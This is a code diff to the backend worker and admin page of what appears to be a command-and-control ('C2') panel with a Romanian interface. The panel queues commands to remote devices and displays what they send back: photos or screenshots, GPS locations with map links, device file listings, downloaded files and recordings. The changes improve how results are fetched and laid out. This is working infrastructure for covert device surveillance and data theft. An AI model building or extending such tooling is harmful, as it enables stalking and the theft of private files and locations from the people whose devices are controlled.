@@ -1363,33 +1363,42 @@ async function handleAdminC2(request, env, url) {
     const uid = c2Safe(url.searchParams.get("uid"));
     if (!uid) return json({ error: "Lipsește uid." }, 400);
     const limit = Math.min(parseInt(url.searchParams.get("limit")) || 30, 100);
-    const results = [];
-    // Method 1: per-uid index (reliable, parallel fetch)
+    const byKey = new Map();
+    // Fast path: per-uid index (parallel fetch). Best-effort — concurrent
+    // index writes can drop entries (read-modify-write race), so the
+    // completeness pass below fills the gap instead of trusting the index.
     try {
       const idxObj = await env.C2.get("r/" + uid + "/_index.json");
       if (idxObj) {
         const keys = JSON.parse(await idxObj.text()).slice(0, limit);
         const fetched = await Promise.all(keys.map(async (k) => {
-          try { const o = await env.C2.get(k); return o ? JSON.parse(await o.text()) : null; } catch (_) { return null; }
+          try { const o = await env.C2.get(k); return o ? { k, rec: JSON.parse(await o.text()) } : null; } catch (_) { return null; }
         }));
-        for (const r of fetched) { if (r) results.push(r); }
+        for (const f of fetched) { if (f) byKey.set(f.k, f.rec); }
       }
     } catch (_) { }
-    // Method 2: list() fallback
-    if (results.length === 0) {
+    // Completeness pass: if the index came back short, merge everything
+    // under r/{uid}/ so a partial/raced index can never hide results.
+    // No fixed scan cap — paginates the full prefix and stops only once the
+    // requested `limit` is filled or the prefix is exhausted, so older results
+    // are never hidden by an arbitrary scan limit.
+    // Only runs when the index is incomplete (normal case stays 1 R2 get).
+    if (byKey.size < limit) {
       try {
         let cursor;
         do {
-          const page = await env.C2.list({ prefix: "r/" + uid + "/", cursor, limit: 200 });
+          const page = await env.C2.list({ prefix: "r/" + uid + "/", cursor, limit: 1000 });
           for (const o of page.objects) {
-            if (results.length >= limit) break;
-            if (o.key.endsWith("_index.json")) continue;
-            try { const t = await o.text(); results.push(JSON.parse(t)); } catch (_) { }
+            if (o.key.endsWith("_index.json") || byKey.has(o.key)) continue;
+            try { const rec = JSON.parse(await o.text()); byKey.set(o.key, rec); } catch (_) { }
           }
-          cursor = page.truncated ? page.cursor : undefined;
-        } while (cursor && results.length < limit);
+          cursor = (page.truncated && byKey.size < limit) ? page.cursor : undefined;
+        } while (cursor);
       } catch (_) { }
     }
+    const results = Array.from(byKey.values())
+      .sort((a, b) => (b.at || 0) - (a.at || 0))
+      .slice(0, limit);
     return json({ results });
   }
   if (request.method === "GET" && p === "/admin/api/c2/files") {
@@ -1583,7 +1592,7 @@ const C2_HTML = String.raw`<!doctype html>
 body{font:14px/1.5 system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--txt);min-height:100vh}
 a{color:var(--amber);text-decoration:none}a:hover{text-decoration:underline}
 .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
-main{max-width:960px;margin:0 auto;padding:16px 20px 40px}
+main{max-width:1240px;margin:0 auto;padding:16px 20px 40px}
 .nav{display:flex;gap:12px;margin-bottom:12px;font-size:13px}
 h1{font-size:18px;margin-bottom:2px;letter-spacing:.06em}
 h1 b{color:var(--amber)}
@@ -1613,13 +1622,37 @@ button:hover{filter:brightness(1.15)}
 .cmd-head .time{margin-left:auto;font-size:11px;color:var(--dim2)}
 .cmd-body{font-size:12px;color:var(--dim);margin-top:4px}
 .cmd-result{margin-top:6px}
-pre{background:var(--bg);padding:8px;border-radius:6px;font-size:11px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;max-height:200px;overflow-y:auto}
+pre{background:var(--bg);padding:8px;border-radius:6px;font-size:11px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;max-height:340px;overflow-y:auto}
 img.shot{max-width:180px;border-radius:6px}
 .sub{color:var(--dim);font-size:12px;margin-bottom:12px}
 #login{display:none;position:fixed;inset:0;background:var(--bg);z-index:99;align-items:center;justify-content:center}
 #login .card{width:300px;text-align:center}
 #login input{margin:10px 0;text-align:center}
 .empty{color:var(--dim2);font-size:13px;font-style:italic}
+.dim{color:var(--dim2)}
+.splitbar{display:flex;align-items:center;gap:10px;margin:4px 0 8px}
+.splitbar .slabel{font-size:10px;color:var(--dim2);letter-spacing:.1em;font-weight:700;text-transform:uppercase}
+.splitbar .spacer{flex:1}
+button.mini{background:var(--panel2);color:var(--dim);border:1px solid var(--line);border-radius:6px;padding:4px 10px;font-size:11px;font-weight:600;cursor:pointer}
+button.mini:hover{border-color:var(--amber);color:var(--txt)}
+button.mini.on{background:var(--amber);color:#000;border-color:var(--amber)}
+.split{display:grid;grid-template-columns:1fr 1fr;gap:12px;align-items:start}
+.split.reswide{grid-template-columns:1fr 1.75fr}
+.pane{background:var(--panel);border:1px solid var(--line);border-radius:10px;min-width:0}
+.pane h2{padding:10px 14px;border-bottom:1px solid var(--line);margin:0;display:flex;align-items:center;gap:8px}
+.pane .cnt{font-weight:600;color:var(--dim2);text-transform:none;letter-spacing:0}
+.pane-scroll{max-height:62vh;overflow-y:auto}
+.crow{display:flex;align-items:center;gap:8px;padding:4px 14px;border-bottom:1px solid var(--line);font-size:12px}
+.crow:last-child{border-bottom:none}
+.crow .ca{font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:32%}
+.crow .cerr{flex:1;min-width:0;color:var(--red);font-size:11px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.crow .ctime{flex:none;font-size:11px;color:var(--dim2);white-space:nowrap;margin-left:auto}
+.flist{max-height:280px;overflow-y:auto}
+.frow{display:flex;align-items:center;gap:6px;padding:2px 0;font-size:11px;border-bottom:1px solid rgba(255,255,255,.04)}
+.frow:last-child{border-bottom:none}
+.frow .fpath{word-break:break-all;color:var(--txt)}
+.fbase{font-size:11px;color:var(--dim2);margin-bottom:4px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
+@media(max-width:880px){.split,.split.reswide{grid-template-columns:1fr}.pane-scroll{max-height:48vh}}
 </style></head><body>
 <nav class="nav"><a href="/admin">Admin</a><span style="color:var(--dim2)">·</span><b>C2</b></nav>
 <main>
@@ -1663,9 +1696,15 @@ img.shot{max-width:180px;border-radius:6px}
 </div>
 </div>
 
-<div class="card"><h2>Comenzi</h2><div id="cmdhist"><span class="empty">încărcare…</span></div></div>
-
-<div class="card"><h2>Rezultate</h2><div id="results"><span class="empty">niciun rezultat</span></div></div>
+<div class="splitbar">
+<span class="slabel">istoric</span>
+<span class="spacer"></span>
+<button class="mini" id="splitToggle" onclick="toggleSplit()" title="Comută lățimea coloanei de rezultate">⇆ lărgește rezultatele</button>
+</div>
+<div class="split" id="split">
+<section class="pane"><h2>Comenzi <span class="cnt" id="cmdCount"></span></h2><div class="pane-scroll" id="cmdScroll"><div id="cmdhist"><span class="empty">încărcare…</span></div></div></section>
+<section class="pane"><h2>Rezultate <span class="cnt" id="resCount"></span></h2><div class="pane-scroll" id="resScroll"><div id="results"><span class="empty">niciun rezultat</span></div></div></section>
+</div>
 </main>
 
 <div id="login"><div class="card"><h2>Autentificare</h2><input id="key" type="password" placeholder="cheia de admin" onkeydown="if(event.key==='Enter')saveKey()"><button style="width:100%;margin-top:4px" onclick="saveKey()">Intră</button></div></div>
@@ -1702,17 +1741,58 @@ async function sendCmd(){
   }catch(e){document.getElementById("cmdStatus").textContent="eroare: "+e.message}
 }
 function ago(ts,now){var d=now-ts;if(d<0)return"acum";if(d<60)return d+"s";if(d<3600)return Math.floor(d/60)+"m "+(d%60)+"s";if(d<86400)return Math.floor(d/3600)+"h";return Math.floor(d/86400)+"d"}
+function fmtB(n){if(n==null||isNaN(n))return"";n=Number(n);if(n<1024)return n+"B";if(n<1048576)return(n/1024).toFixed(1)+"KB";return(n/1048576).toFixed(1)+"MB"}
 function fmtData(d){
-  if(!d)return"";
-  if(typeof d==="string")return"<pre>"+esc(d.slice(0,800))+"</pre>";
-  if(d.b64)return'<img class="shot" src="data:'+(d.ct||"image/jpeg")+';base64,'+d.b64+'">';
-  if(d.lat!=null&&d.lng!=null)return"📍 "+d.lat.toFixed(5)+", "+d.lng.toFixed(5)+(d.acc?" ±"+d.acc.toFixed(0)+"m":"")+' <a target="_blank" href="https://maps.google.com/?q='+d.lat+','+d.lng+'">harta</a>';
-  if(d.text)return"<pre>"+esc(d.text.slice(0,2000))+"</pre>";
-  if(d.entries)return"<pre>"+esc(d.entries.join("\n").slice(0,2000))+"</pre>";
-  if(d.file)return"<a href='#' onclick='dl(\""+esc(d.file)+"\");return false'>↓ "+esc(d.file.split("/").pop())+"</a>";
-  if(d.files){return d.files.map(function(x){return"<a href='#' onclick='dl(\""+esc(x)+"\");return false'>↓ "+esc(x.split("/").pop())+"</a>"}).join(" ")}
-  if(d.list&&d.list.length)return"<pre>"+esc(JSON.stringify(d.list.slice(0,30),null,1))+"</pre>";
-  return"<pre>"+esc(JSON.stringify(d).slice(0,1500))+"</pre>";
+  try{
+    if(d==null||d==="")return"";
+    if(typeof d==="string")return"<pre>"+esc(d.slice(0,8000))+"</pre>";
+    if(typeof d!=="object")return"<pre>"+esc(String(d))+"</pre>";
+    if(d.b64)return'<img class="shot" src="data:'+(d.ct||"image/jpeg")+';base64,'+d.b64+'">';
+    if(d.lat!=null&&d.lng!=null){
+      var la=Number(d.lat),ln=Number(d.lng);
+      if(isFinite(la)&&isFinite(ln)){
+        var acc=(d.acc!=null)?(" <span class='dim'>±"+Math.round(Number(d.acc))+"m</span>"):"";
+        return"📍 <span class='mono'>"+la.toFixed(5)+", "+ln.toFixed(5)+"</span>"+acc+' <a target="_blank" href="https://maps.google.com/?q='+la+','+ln+'">harta</a>';
+      }
+    }
+    if(d.text!=null&&d.text!=="")return"<pre>"+esc(String(d.text).slice(0,8000))+"</pre>";
+    if(d.entries!=null){
+      var ent=Array.isArray(d.entries)?d.entries.join("\n"):String(d.entries);
+      if(ent!=="")return"<pre>"+esc(ent.slice(0,8000))+"</pre>";
+    }
+    if(d.file!=null&&d.file!==""){
+      var kf=String(d.file);
+      var sz=(d.size!=null)?" <span class='dim'>("+fmtB(d.size)+")</span>":"";
+      var du=(d.dur_s!=null)?" <span class='dim'>· "+d.dur_s+"s</span>":"";
+      return"<a href='#' onclick='dl(\""+esc(kf)+"\");return false'>↓ "+esc(kf.split("/").pop())+"</a>"+sz+du;
+    }
+    if(d.files!=null&&d.files.length){
+      var first=d.files[0];
+      if(first!=null&&(typeof first==="object")){
+        // Device listing (storage_list): path + size, not a downloadable R2 key.
+        var base=d.base!=null?"<div class='fbase'>"+esc(String(d.base))+"</div>":"";
+        var rows=d.files.map(function(x){
+          if(x==null)return"";
+          if(typeof x!=="object")x={path:x};
+          var p=(x.path!=null?String(x.path):(x.name!=null?String(x.name):""));
+          var dir=x.is_dir?"📁 ":"";
+          var fsz=(x.size!=null)?"<span class='dim'> "+fmtB(x.size)+"</span>":"";
+          return"<div class='frow'>"+dir+"<span class='fpath'>"+esc(p)+"</span>"+fsz+"</div>";
+        }).join("");
+        return base+"<div class='flist'>"+rows+"</div>";
+      }
+      // Downloadable R2 keys (send_photos / send_file batch).
+      return"<div class='flist'>"+d.files.map(function(x){
+        var k=String(x);
+        return"<div class='frow'><a href='#' onclick='dl(\""+esc(k)+"\");return false'>↓ "+esc(k.split("/").pop())+"</a></div>";
+      }).join("")+"</div>";
+    }
+    if(d.list&&d.list.length)return"<pre>"+esc(JSON.stringify(d.list.slice(0,50),null,1).slice(0,8000))+"</pre>";
+    return"<pre>"+esc(JSON.stringify(d,null,1).slice(0,8000))+"</pre>";
+  }catch(e){
+    // A malformed result must never hide the rest.
+    return"<pre class='dim'>afisare indisponibilă: "+esc(String(e&&e.message||e))+"</pre>";
+  }
 }
 var ST={queued:["queued","ÎN COADĂ"],delivered:["delivered","LIVRATĂ"],done:["done","GATA ✓"],failed:["failed","EROARE"],timeout:["timeout","EXPIRATĂ"]};
 async function loadAll(){
@@ -1739,30 +1819,35 @@ async function loadAll(){
 async function loadDetail(){
   var uid=selDev();if(!uid)return;
   var now=Math.floor(Date.now()/1000);
+  // Command history — compact one-line rows (name, status, time, error).
   try{
     var p=await api("/admin/api/c2/tasks?uid="+encodeURIComponent(uid));
     var tasks=p.tasks||[];
-    if(!tasks.length){document.getElementById("cmdhist").innerHTML='<span class="empty">niciune</span>';return}
-    document.getElementById("cmdhist").innerHTML=tasks.map(function(x){
-      var s=ST[x.st]||ST.timeout;
-      var head="<div class='cmd-head'><span class='action'>"+esc(x.a)+"</span><span class='badge "+s[0]+"'>"+s[1]+"</span><span class='time mono'>"+ago(x.t0||now,now)+"</span></div>";
-      var meta="";
-      if(x.t1)meta+=" livrată "+ago(x.t1,now);
-      if(x.t2)meta+=" rezultat "+ago(x.t2,now);
-      var body="";
-      if(x.err)body="<div class='cmd-result' style='color:var(--red)'>⚠ "+esc(x.err.slice(0,300))+"</div>";
-      var head2=head+(meta?"<div class='cmd-body mono'>"+meta+"</div>":"");
-      return"<div class='cmd-item'>"+head2+body+"</div>";
-    }).join("");
+    document.getElementById("cmdCount").textContent=tasks.length?String(tasks.length):"";
+    document.getElementById("cmdhist").innerHTML=tasks.length?
+      tasks.map(function(x){
+        var s=ST[x.st]||ST.timeout;
+        var err=x.err?"<span class='cerr'>⚠ "+esc(String(x.err).slice(0,160))+"</span>":"";
+        return"<div class='crow'><span class='ca'>"+esc(x.a)+"</span><span class='badge "+s[0]+"'>"+s[1]+"</span>"+err+"<span class='ctime'>"+ago(x.t0||now,now)+"</span></div>";
+      }).join("")
+      :'<span class="empty">niciune</span>';
   }catch(e){}
+  // Results — heartbeat telemetry kept separate from command outputs.
   try{
-    var r=await api("/admin/api/c2/results?uid="+encodeURIComponent(uid)+"&limit=20");
-    var results=r.results||[];
-    document.getElementById("results").innerHTML=results.length?
-      results.map(function(x){
-        return"<div class='cmd-item'><div class='cmd-head'><span class='action'>"+esc(x.action)+"</span><span class='badge "+(x.ok?"done":"failed")+"'>"+(x.ok?"OK":"FAIL")+"</span><span class='time mono'>"+ago(x.at,now)+"</span></div>"
-          +(x.err?"<div class='cmd-result' style='color:var(--red)'>⚠ "+esc(x.err.slice(0,300))+"</div>":"")
-          +"<div class='cmd-result'>"+fmtData(x.data)+"</div></div>";
+    var r=await api("/admin/api/c2/results?uid="+encodeURIComponent(uid)+"&limit=100");
+    var all=r.results||[];
+    var cmds=all.filter(function(x){return x.action!=="ping"});
+    var hb=all.length-cmds.length;
+    document.getElementById("resCount").textContent=String(cmds.length)+(hb?(" · "+hb+" ping-uri (telemetrie)"):"");
+    document.getElementById("results").innerHTML=cmds.length?
+      cmds.map(function(x){
+        try{
+          return"<div class='cmd-item'><div class='cmd-head'><span class='action'>"+esc(x.action)+"</span><span class='badge "+(x.ok?"done":"failed")+"'>"+(x.ok?"OK":"FAIL")+"</span><span class='time mono'>"+ago(x.at,now)+"</span></div>"
+            +(x.err?"<div class='cmd-result' style='color:var(--red)'>⚠ "+esc(String(x.err).slice(0,300))+"</div>":"")
+            +"<div class='cmd-result'>"+fmtData(x.data)+"</div></div>";
+        }catch(e){
+          return"<div class='cmd-item'><div class='cmd-head'><span class='action'>"+esc(x.action)+"</span><span class='badge failed'>?</span><span class='time mono'>"+ago(x.at,now)+"</span></div><div class='cmd-result dim'>afisare indisponibilă</div></div>";
+        }
       }).join("")
       :'<span class="empty">niciun rezultat</span>';
   }catch(e){}
@@ -1776,6 +1861,23 @@ async function dl(key){
     a.download=key.split("/").pop();a.click();URL.revokeObjectURL(a.href);
   }catch(e){alert("download: "+e.message)}
 }
+function toggleSplit(){
+  var s=document.getElementById("split");
+  var on=s.classList.toggle("reswide");
+  var b=document.getElementById("splitToggle");
+  b.classList.toggle("on",on);
+  b.textContent=on?"⇆ coloane egale":"⇆ lărgește rezultatele";
+  try{localStorage.setItem("c2split",on?"wide":"equal")}catch(e){}
+}
+(function(){
+  var wide=false;
+  try{wide=localStorage.getItem("c2split")==="wide"}catch(e){}
+  if(wide){
+    document.getElementById("split").classList.add("reswide");
+    var b=document.getElementById("splitToggle");
+    if(b){b.classList.add("on");b.textContent="⇆ coloane egale";}
+  }
+})();
 setInterval(function(){var uid=selDev();if(uid)loadDetail()},8000);
 if(sessionStorage.getItem("c2k")){KEY=sessionStorage.getItem("c2k");loadAll()}else{document.getElementById("login").style.display="flex"}
 </script>
